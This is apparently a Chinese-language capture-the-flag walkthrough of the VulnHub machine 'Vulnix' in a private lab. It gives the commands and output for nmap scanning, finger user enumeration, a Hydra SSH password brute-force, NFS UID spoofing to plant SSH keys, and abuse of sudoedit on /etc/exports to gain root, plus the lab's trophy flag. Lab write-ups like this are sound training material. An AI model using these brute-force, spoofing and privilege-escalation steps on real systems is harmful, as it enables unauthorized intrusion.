### port scan

```bash
# Nmap 7.94SVN scan initiated Sun Nov 10 01:50:10 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.27.6
Nmap scan report for 192.168.27.6
Host is up (0.0022s latency).
Not shown: 65518 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
79/tcp    open  finger
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
36951/tcp open  unknown
40856/tcp open  unknown
58796/tcp open  unknown
59337/tcp open  unknown
59705/tcp open  unknown
MAC Address: 00:0C:29:FA:2A:6E (VMware)
```

```bash
nmap -sT -sV -sC -O -p22,25,79,110,111,143,512,513,514,993,995,2049,36951,40856,58796,59337,59705 -oN nmap_results/detils_scan 192.168.27.6
```

#### vuln scan

```bash
nmap --script=vuln -p22,25,79,110,111,143,512,513,514,993,995,2049,36951,40856,58796,59337,59705 -oN nmap_results/srcipt_scan 192.168.27.6
```

### servrices enumeration

先枚举`smtp`服务

> https://github.com/pentestmonkey/finger-user-enum

```bash
./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.27.6
```

![image-20241110154619981](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241110154619981.png)

一个`user`,一个`root`

`finger`服务

```bash
┌──(root㉿kali)-[~/vulnhub/HackLAB_Vulnix]
└─# finger user@192.168.27.6
Login: user                             Name: user
Directory: /home/user                   Shell: /bin/bash
On since Sun Nov 10 07:40 (GMT) on pts/0 from 192.168.27.3
   7 minutes 40 seconds idle
No mail.
No Plan.

Login: dovenull                         Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

`2049/tcp  open  nfs`

```bash
┌──(root㉿kali)-[~/vulnhub/HackLAB_Vulnix]
└─# showmount -e 192.168.27.6
Export list for 192.168.27.6:
/home/vulnix *
                                                                                                                                                                          
┌──(root㉿kali)-[~/vulnhub/HackLAB_Vulnix]
└─# mount -t nfs 192.168.27.6:/home/vulnix vulnix  -nolock                       
mount.nfs: access denied by server while mounting 192.168.27.6:/home/vulnix
                                                                                                                                                                          
┌──(root㉿kali)-[~/vulnhub/HackLAB_Vulnix]
└─# cd vulnix                    
cd: permission denied: vulnix
```

`SSH`服务

```bash
┌──(root㉿kali)-[~/vulnhub/HackLAB_Vulnix]
└─# hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.27.6 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[DATA] attacking ssh://192.168.27.6:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[STATUS] 33.33 tries/min, 100 tries in 00:03h, 14344299 to do in 7172:09h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344195 to do in 8203:23h, 4 active
[STATUS] 29.40 tries/min, 441 tries in 00:15h, 14343958 to do in 8131:30h, 4 active
[22][ssh] host: 192.168.27.6   login: user   password: letmein
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-10 02:39:06
```

拿到凭据`user:letmein`

### SSH

```bash
ssh user@192.168.27.6
```

密码：`letmein`

### Privilege Escalation

#### vulnix

查看`passwd`文件

```
vulnix:x:2008:2008::/home/vulnix:/bin/bash
```

NFS共享文件是否可以访问，取决于用户和组 ID 映射，可能与 `root_squash` 或 `all_squash` 选项配置有关

> - `ro`：只读访问。
> - `rw`：读写访问。
> - `sync`：同步写入磁盘。
> - `async`：异步写入磁盘（默认）。
> - `no_root_squash`：允许远程 root 用户具有本地 root 权限。
> - `root_squash`：将远程 root 用户的权限降低到匿名用户（默认）。
> - `all_squash`：将所有远程用户的身份降低到匿名用户。
> - `anonuid`：指定匿名用户的 UID。
> - `anongid`：指定匿名用户的 GID。
> - `subtree_check`：允许递归导出。

已知`vulnix`用户的UID是`2008`，可以在kali机器上同样创建一个`vulnix`用户

```
useradd -u 2008 vulnix
```

挂载共享文件

```bash
mount -t nfs 192.168.27.6:/home/vulnix /tmp/mnt -nolock
```

```bash
┌──(root㉿kali)-[/tmp]
└─# su vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd /tmp/mnt
$ ls -la
total 32
drwxr-x---  4 vulnix vulnix 4096 Nov 10 04:40 .
drwxrwxrwt 20 root   root    500 Nov 10 04:39 ..
-rw-------  1 vulnix vulnix   33 Nov 10 04:40 .bash_history
-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------  2 vulnix vulnix 4096 Nov 10 03:40 .cache
-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile
-rw-------  1 vulnix vulnix  654 Nov 10 04:39 .viminfo
```

挂载成功，可以访问，现在将kali的SSH公钥写进`.ssh`文件，就可以登录`vulnix`用户

`ssh-keygen`创建公钥，回车就行

`ssh-keygen -t rsa`

将`id_rsa.pub`文件，复制到`.ssh/authorized_keys`

```bash
$ cd .ssh
$ ls -al
total 12
drwx------ 2 vulnix vulnix 4096 Nov 10 03:39 .
drwxr-x--- 4 vulnix vulnix 4096 Nov 10 04:40 ..
-rw-r--r-- 1 vulnix vulnix  563 Nov 10 04:38 authorized_keys
$ cat au*
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2nUXm4REZFae90PHbMmdaWoCkDetBLi3yW6rkbd8lRpSHXEf6Lii6wWWDvRZwELJHjhRLEgvnqgvtHSyL1WLrxMXbEjMnhofQwjaVZk2b4D1MtWtH3see7Pg8iFiy4SsPkFdgPAGQxNiJNvus4kuDvFHqHDUNEuoQCcaRF9e3Wd9U2UqVI0ZqRfrKswL47vePb5IaRLNgM7EJlGWlP+ZsP1QP/tvYgjec0MOgclbwbrlVrjUGr+STyfiUXM4QbSy5AxUAVXHTYh77L1KrSP1xurjU0D5dI8RTcYvMbAG5kMgWAVulO6dCFmKeJuu5GoQuo1+2kasz3HtoeNsxsuCQTs7b3jmLpEsd4487HxRtl/V0d+CrAcJ7nph1sI2m/+UFbuZ3V/p74BdtyokEGhnhm86rwDkQs81rR6ZncxPn8DE7C+avmp5HuCyk8WAYbes5S17fU9Anr0WS9I8kRpHHZzUX8Zh3BC/gMG4rACGE/DoDa5Pzj2Alz6UVow7Ml08= root@kali
```

登录，指定公钥类型

```bash
ssh vulnix@192.168.27.6 -oPubkeyAcceptedKeyTypes=ssh-rsa
```

#### root

```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

可编辑`/etc/exports`文件

`/root    *(rw,no_root_squash)`写入文件

```bash
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
/root    *(rw,no_root_squash)
```

可能需要重启一下生效文件

```bash
┌──(root㉿kali)-[/tmp]
└─# showmount -e 192.168.27.6                               
Export list for 192.168.27.6:
/root        *
/home/vulnix *
```

同样挂载`/root`，复制公钥，登录

```bash
ssh root@192.168.27.6 -oPubkeyAcceptedKeyTypes=ssh-rsa
```

```bash
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root)
root@vulnix:~# whoami
root
root@vulnix:~# ls
trophy.txt
root@vulnix:~# cat trophy.txt 
cc614640424f5bd60ce5d5264899c3be
```

